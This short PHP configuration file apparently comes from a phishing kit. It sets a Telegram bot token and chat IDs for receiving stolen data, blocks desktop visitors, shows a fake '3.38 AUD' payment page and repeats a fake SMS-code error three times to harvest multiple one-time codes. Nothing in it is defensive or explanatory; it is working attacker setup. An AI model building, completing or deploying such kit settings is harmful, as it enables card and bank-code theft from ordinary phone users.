<?php 

//Have a telegram bot? put the tokens here :D
$bot = "8987639873:HJDhjgGEUI6398djhdgbjbkhJT378Y3I";
$chat_ids = array("778638963");


// to block pc - on | off
$block_pc = "off";


//seconds of waiting
$seconds = 1;


// Amount to show in payment page.
$amount = "3.38 AUD";


// how many times the user will see sms error.
$sms_error_times = 3;


?>